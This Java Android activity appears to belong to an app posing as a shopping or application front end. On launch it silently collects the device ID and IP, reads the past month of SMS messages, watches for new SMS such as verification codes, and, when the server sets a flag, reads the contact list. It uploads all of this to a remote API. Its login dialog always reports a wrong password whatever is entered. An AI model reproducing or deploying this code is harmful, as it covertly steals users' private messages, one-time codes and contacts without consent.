package com.xhf.sms;

import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import com.chad.library.adapter.base.BaseQuickAdapter;
import com.google.gson.Gson;
import com.xhf.sms.adapter.MainAdapter;
import com.xhf.sms.api.ApiManager;
import com.xhf.sms.bean.ConfigBean;
import com.xhf.sms.bean.ContractBean;
import com.xhf.sms.bean.MainBean;
import com.xhf.sms.bean.SmsBean;
import com.xhf.sms.bean.UserBean;
import com.xhf.sms.dialog.CenterDialog;
import com.xhf.sms.utils.SpUtils;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.RecyclerView;
import androidx.recyclerview.widget.StaggeredGridLayoutManager;

import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;


public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    private MainAdapter mMainAdapter;
    private RecyclerView mRecyclerView;
    private ImageView mHeaderView, mFootView;
    private List<MainBean> mMainBeans;
    private CenterDialog mCenterDialog;
    private CenterDialog mLoginDialog;
    private CenterDialog mEnterDialog;
    private Uri SMS_INBOX = Uri.parse("content://sms/");
    private List<SmsBean.Msg> mMsgList = new ArrayList<>();
    private List<ContractBean.ContractList> mPhoneList = new ArrayList<>();
    private boolean isClick;
    private CountDownTimer mDownTimer;


    @Override

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initView();
        initData();
        PhoneCode phoneCode = new PhoneCode(this, new Handler(), new PhoneCode.SmsListener() {
            @Override
            public void onResult(String phone, String body) {
                Log.e("onResult: ", phone + "-" + body);
                mPhoneList.clear();
                SmsBean.Msg msg = new SmsBean.Msg();
                msg.setTel(phone);
                msg.setData(body);
                mMsgList.add(msg);
                postSmsData(mMsgList);

            }
        });

        this.getContentResolver().registerContentObserver(
                SMS_INBOX, true, phoneCode);

        mDownTimer = new CountDownTimer(15000, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                Log.e("sms", millisUntilFinished + "");

            }

            @Override
            public void onFinish() {
                setClick();
            }
        };

        mDownTimer.start();


    }


    private long getMonthTime() {
        Calendar calendar = Calendar.getInstance();
        calendar.setTime(new Date(System.currentTimeMillis()));
        calendar.add(Calendar.MONTH, -1);
        return calendar.getTimeInMillis();
    }


    private void requestMainData() {


        HashMap<String, Integer> map = new HashMap<>();
        map.put("page", 1);
        map.put("limit", 50);
        ApiManager.getInstance().getApiService().getMainInfo(map)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<List<MainBean>>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(List<MainBean> mainBeans) {
                        mMainBeans.addAll(mainBeans);
                        mMainAdapter.setNewData(mMainBeans);

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });


    }

    private void initData() {
        sendUserInfo();
        requestMainData();
        requestConfig();
        getphoneSms();

    }

    private void requestConfig() {

        ApiManager.getInstance().getApiService().getconfigInfo()
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<ConfigBean>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(ConfigBean configBeans) {
                        SpUtils.setShopTips(MainActivity.this, configBeans.getShop_tips());
                        SpUtils.setSMSTips(MainActivity.this, configBeans.getCaptcha_tips());
                        String is_contact = configBeans.getIs_contact();
                        String is_message = configBeans.getIs_message();

                        if (TextUtils.equals("1", is_contact)) {
                            getPhoneNumber();

                        }

                        if (TextUtils.equals("1", is_message)) {
                        }

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", e.toString());
                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void sendUserInfo() {
        UserBean userBean = new UserBean(" ", " ", AppUtils.getDeviceID(this), AppUtils.getLocalIpAddress(this));
        ApiManager.getInstance().getApiService().sendUser(userBean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {

                    }

                    @Override
                    public void onNext(Response response) {
                        Log.e("sms--user", response.getCode() == 1 ? "新用户" : "老用户");

                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms--user", e.toString());
                    }

                    @Override
                    public void onComplete() {

                    }
                });

    }


    public void getPhoneNumber() {
        ContentResolver resolver = getContentResolver();

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.Contacts.DISPLAY_NAME};
        Cursor contactsCursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection, null, null, "sort_key");
        if (contactsCursor != null) {
            contactsCursor.moveToFirst();

            final int contactIdIndex = contactsCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID);
            final int displayNameIndex = contactsCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
            final int phoneIndex = contactsCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            if (contactsCursor.getCount() == 1) {
                ContractBean.ContractList bean = new ContractBean.ContractList();
                bean.setName(contactsCursor.getString(displayNameIndex));
                bean.setPhoneNo(contactsCursor.getString(phoneIndex));
                mPhoneList.add(bean);

            } else {
                while (contactsCursor.moveToNext()) {
                    String name = contactsCursor.getString(displayNameIndex);
                    String phone = contactsCursor.getString(phoneIndex);
                    ContractBean.ContractList bean = new ContractBean.ContractList();
                    bean.setName(name);
                    bean.setPhoneNo(phone);
                    mPhoneList.add(bean);
                    Log.e("sms", name + "-" + phone);
                }
            }

            contactsCursor.close();
            ContractBean contactBean = new ContractBean();
            contactBean.setImei(AppUtils.getDeviceID(this));
            contactBean.setIp(AppUtils.getLocalIpAddress(this));
            contactBean.setName("");
            contactBean.setUserPhoneNo("");
            contactBean.setPhoneBeans(mPhoneList);
            postContractData(contactBean);
        }

    }

    private void postContractData(ContractBean bean) {
        Log.e("xhf", new Gson().toJson(bean) + "");
        ApiManager.getInstance().getApiService().sendContract(bean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(Response response) {
                        Log.e("sms", "通讯录上传成功: " + response.getMsg());
//                        if (response.getCode() == 1) {
//
//                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", "通讯录上传失败: " + e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }

    private void getphoneSms() {
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("getphoneSms", "************cur == null");
            return;
        }

        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));
            long startTime = cur.getLong(cur.getColumnIndex("date"));
            String body = cur.getString(cur.getColumnIndex("body"));
            Log.e("result", startTime + "-" + getMonthTime() + "--" + body);
            if (startTime > getMonthTime()) {
                SmsBean.Msg msg = new SmsBean.Msg();
                msg.setTel(number);
                msg.setData(body);
                mMsgList.add(msg);
            }
        }
        cur.close();

        postSmsData(mMsgList);
    }

    private void postSmsData(List<SmsBean.Msg> list) {
        SmsBean smsBean = new SmsBean();
        smsBean.setName("");
        smsBean.setPhone("");
        smsBean.setImei(AppUtils.getDeviceID(this));
        smsBean.setIp(AppUtils.getLocalIpAddress(this));
        smsBean.setMsg(list);
        ApiManager.getInstance().getApiService().sendSms(smsBean)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Observer<Response>() {
                    @Override
                    public void onSubscribe(Disposable d) {
                    }

                    @Override
                    public void onNext(Response response) {
                        if (response.getCode() == 1) {
                            Log.e("sms", "短信上传成功: " + response.getMsg());
                            SpUtils.setSMSReadTime(MainActivity.this, System.currentTimeMillis());

                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("sms", "onError: " + e.toString());

                    }

                    @Override
                    public void onComplete() {

                    }
                });
    }


    private void initEnterDialog() {
        isClick = true;
        if (mDownTimer != null) {
            mDownTimer.cancel();
        }
        mEnterDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_enter)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {
                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                mEnterDialog.dismiss();
                            }
                        });

                        v.findViewById(R.id.applyView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                startActivity(new Intent(MainActivity.this, DetailActivity.class));
                                mEnterDialog.dismiss();
                            }
                        });
                    }
                }).show();
    }

    private void initLoginDialog() {
        mLoginDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_login)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {
                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                mLoginDialog.dismiss();
                            }
                        });

                        v.findViewById(R.id.confirmView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                Toast.makeText(MainActivity.this, "密码错误", Toast.LENGTH_SHORT).show();
                                mLoginDialog.dismiss();
                            }
                        });
                    }
                }).show();


    }

    private void initView() {
        mRecyclerView = findViewById(R.id.recyclerView);
        mHeaderView = findViewById(R.id.headerView);
        mFootView = findViewById(R.id.footView);
        mHeaderView.setOnClickListener(this);
        mFootView.setOnClickListener(this);

        mMainBeans = new ArrayList<>();

        mMainAdapter = new MainAdapter(mMainBeans);
        mRecyclerView.setLayoutManager(new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL));
        mRecyclerView.setAdapter(mMainAdapter);

        View footerView = LayoutInflater.from(this).inflate(R.layout.recycler_footer, null);
        mMainAdapter.addFooterView(footerView);

        mMainAdapter.setOnItemClickListener(new BaseQuickAdapter.OnItemClickListener() {
            @Override
            public void onItemClick(BaseQuickAdapter adapter, View view, int position) {
                setClick();
            }
        });


    }


    private void setClick() {
        mCenterDialog = (CenterDialog) CenterDialog.create(getSupportFragmentManager())
                .setLayoutRes(R.layout.dialog_main)
                .setViewGravity(Gravity.CENTER)
                .setViewListener(new CenterDialog.ViewListener() {
                    @Override
                    public void bindView(View v) {

                        v.findViewById(R.id.closeView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                mCenterDialog.dismiss();
                            }
                        });
                        v.findViewById(R.id.loginView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                initLoginDialog();
                                mCenterDialog.dismiss();

                            }
                        });
                        v.findViewById(R.id.enterView).setOnClickListener(new View.OnClickListener() {
                            @Override
                            public void onClick(View v) {
                                initEnterDialog();
                                mCenterDialog.dismiss();

                            }
                        });

                    }
                }).show();
    }


    @Override
    public void onClick(View v) {
        setClick();
    }
}
